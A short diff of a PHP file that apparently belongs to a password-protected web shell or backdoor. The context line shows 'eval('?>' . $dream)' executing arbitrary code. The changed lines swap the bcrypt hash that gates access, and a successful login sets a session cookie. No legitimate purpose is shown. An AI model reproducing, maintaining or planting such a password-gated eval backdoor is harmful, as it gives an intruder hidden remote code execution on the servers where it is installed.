@@ -64,7 +64,7 @@ eval('?>' . $dream);
 } else {
 if (isset($_POST['password'])) {
 $entered_key = $_POST['password'];
-$hashed_key = '$2y$10$8ZXqkAkM8Yz9bRXbV7TWruZFzK1S6WKZbF3abF9HGdOYcjb2ug.2.'; // https://bcrypt.online/
+$hashed_key = '$2y$10$NNMmztPhDYb4ORcDR.Yxe.01tbWX.6egj08n0n9Dpk00/5u8W5mUa'; // https://bcrypt.online/
 
 if (password_verify($entered_key, $hashed_key)) {
 setcookie('hypnosis', 'PLUTO', time() + 3600, '/');
